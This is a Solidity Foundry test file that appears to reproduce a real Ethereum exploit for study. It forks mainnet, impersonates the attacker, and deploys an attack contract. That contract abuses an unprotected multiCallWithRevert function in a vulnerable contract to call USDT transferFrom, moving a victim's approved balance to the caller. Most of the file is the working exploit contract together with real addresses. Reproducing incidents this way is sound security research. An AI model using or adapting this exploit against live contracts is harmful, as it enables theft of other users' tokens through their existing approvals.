pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

address constant TetherToken = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant attacker = 0x101723dEf8695f5bb8D5d4AA70869c10b5Ff6340;
address constant addr1 = 0x16D0DC96c1BdF283Ce1FF10E01924Ac76B06c95c;
address constant addr2 = 0x2C45a940Db1F16caA1B6bD73725Ea4A3ac6c871B;

// @KeyInfo - Total Lost : $329
// Attacker : https://etherscan.com/address/0x101723def8695f5bb8d5d4aa70869c10b5ff6340
// Attack Contract : https://etherscan.io/address/0x0bf3ceaef75e4904ca08ff42f0d83e89b16c30b2
// Vulnerable Contract : https://etherscan.io/address/0x16d0dc96c1bdf283ce1ff10e01924ac76b06c95c
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xf5f251fd4ed77e24d803d8241e2e852f0781a145891411dd4eb45306eacf12a8

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1831511554619273630
// Twitter Guy : https://x.com/TenArmorAlert/status/1831511554619273630
// Hacking God : N/A

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20677976-1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(attacker), 18);
    }
}

// 0x0Bf3ceAEf75e4904Ca08Ff42F0D83E89b16C30b2
contract AttackerC {
    function attack() public {
        uint256 bal = ITetherToken(TetherToken).balanceOf(addr2);
        uint256 allw = ITetherToken(TetherToken).allowance(addr2, addr1);
        if (bal < allw) {
            if (bal > 0) {
                bytes[] memory calls = new bytes[](1);
                // transferFrom(addr2, tx.origin, bal)
                calls[0] = abi.encode(
                    bytes4(0x23b872dd),
                    addr2,
                    tx.origin,
                    bal
                );
                // multiCallWithRevert(address token, bytes[] calldata data)
                (bool ok, ) = addr1.call(
                    abi.encodeWithSignature(
                        "multiCallWithRevert(address,bytes[])",
                        TetherToken,
                        calls
                    )
                );
                require(ok, "multiCallWithRevert failed");
            }
        }
    }
}

interface ITetherToken {
	function allowance(address, address) external returns (uint256);
	function balanceOf(address) external returns (uint256); 
}
